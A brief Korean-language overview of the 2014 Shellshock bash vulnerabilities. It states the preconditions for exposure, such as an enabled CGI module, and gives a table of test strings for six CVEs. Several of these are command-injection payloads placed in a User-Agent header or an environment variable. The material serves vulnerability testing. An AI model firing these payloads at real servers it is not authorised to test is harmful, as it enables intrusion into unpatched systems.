# 개요

* 리눅스를 포함한 유닉스 계열 운영체제에서 사용되는 명령어 실행 툴인 bash로부터 발생하는 취약점

# 알려진 내용

#### 공통사항\(취약한 버전의 bash 쉘을 사용중일 경우\)

1. 파싱 오류로 인한 보안 취약점 노출: 특정 프로세스를 생성하는 등의 행위를 하는 모듈이 동작해야 함 \(Ex: Enabled CGI module on the apache web server\)
2. 메모리 실행 오류로 인한 보안 취약점 노출: 위의 공통 사항과 동일

#### 취약점 분류 내역

| CVE NAME | Test Code |
| :--- | :--- |
| CVE-2014-6271 | User-Agent: \(\) { :;}; /bin/bash -c "ping ${IP\_ADDRESS} –c3" |
| CVE-2014-6277 | User-Agent: \(\) { 0; }; /bin/bash -c 'x\(\) { \_; }; x\(\) { \_; } &lt;&lt;a;' |
| CVE-2014-6278 | User-Agent: \(\) { \_; } &gt;\_\[$\($\(\)\)\] { id &gt;/tmp/CVE-2014-6278; } |
| CVE-2014-7169 | env X='\(\) { \(a\)=&gt;\' bash -c "echo date" |
| CVE-2014-7186 | bash -c 'true &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF' |
| CVE-2014-7187 | \(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done\) \| bash \|\| echo "CVE-2014-7187 vulnerable, word\_lineno" |



